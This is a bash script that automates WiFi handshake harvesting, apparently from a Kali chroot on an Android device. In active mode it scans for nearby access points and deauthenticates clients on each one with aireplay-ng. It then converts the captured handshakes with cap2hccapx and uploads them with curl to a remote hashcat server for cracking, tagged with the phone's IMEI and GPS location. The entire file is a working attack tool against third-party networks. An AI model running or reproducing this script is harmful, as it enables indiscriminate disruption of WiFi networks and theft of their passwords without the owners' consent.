#!/bin/bash

checkUtils() {
  echo "Check utils"
  if [ ! -f /bin/cap2hccapx ]; then
    echo "No cap2hccapx"
    echo "Please, install cap2hccapx:"
    echo "git clone https://github.com/hashcat/hashcat-utils.git"
    echo "cd hashcat-utils/src"
    echo "make"
    echo "chmod +x cap2hccapx.bin"
    echo "cp cap2hccapx.bin /bin"
    exit 1
  fi
}

sendHandshake() {
  # echo $1
  # echo $2
  long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $13}')
  echo "Long: "$long
  lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
  echo "Lat: "$lat
  imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
  echo "IMEI: "$imei
  curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
  if [[ $? == 0 ]]; then
    rm $1
  else
    echo "Failed send file $1"
  fi
}

checkHandshakes() {
  echo $1
  echo "Check handshakes..."
  output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx)
  echo $output
  if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
    echo "No handshakes"
    rm /home/kali/cleanshakes.hccapx >/dev/null
  else
    echo "Handshakes detected!!!"
    if [[ -d /home/kali/shakes ]]; then
      if [[ $(ls /home/kali/shakes/ | wc -l) -ne 0 ]]; then
        lastNum=$(($(head -n 1 /home/kali/shakes/.counter) + 1))
        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake${lastNum}
        echo $lastNum >/home/kali/shakes/.counter
        sendHandshake /home/kali/shakes/shake${lastNum} $1
      else
        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
        touch /home/kali/shakes/.counter
        echo "1" >/home/kali/shakes/.counter
        sendHandshake /home/kali/shakes/shake1 $1
      fi
    else
      mkdir /home/kali/shakes
      chmod 777 -R /home/kali/shakes
      mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
      touch /home/kali/shakes/.counter
      echo "1" >/home/kali/shakes/.counter
      sendHandshake /home/kali/shakes/shake1 $1
    fi
  fi
  echo ""
}

active() {
  trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
  airmon-ng check kill
  airmon-ng start wlan1
  echo "Collect APs..."
  timeout 15 airodump-ng -w /home/kali/shakesCollector wlan1 </dev/null >/dev/null
  counter=0

  while read line; do
    if [[ $counter -lt 2 ]]; then
      counter=$(($counter + 1))
      continue
    fi

    channel=$(echo $line | awk '{print $6}')
    channel=${channel::-1} #delete last ,
    bssid=$(echo $line | awk '{print $1}')
    bssid=${bssid::-1}
    echo $bssid
    echo $channel

    iwconfig wlan1 channel $channel
    timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 </dev/null >/dev/null &
    aireplay-ng -a $bssid -0 10 wlan1
    sleep 10
    checkHandshakes $2
    rm /home/kali/shakes-* >/dev/null
  done </home/kali/shakesCollector-01.csv

}

passive() {
  trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT
  airmon-ng start wlan1 >/dev/null
  echo "Start airodump.."
  timeout 60 airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
  checkHandshakes $1
  rm /home/kali/shakes-*
  passive $1
}

if [[ $2 == "" ]]; then
  echo "Please enter hashcat server address second argument"
  exit 1
fi

if [[ $1 == "p" ]]; then
  echo "Selected passive mode"
  echo $2
  passive $2
elif [[ $1 == "a" ]]; then
  echo "Selected active mode"
  active $2
else
  echo "Use a - active or p - passive as first argument"
  exit 1
fi
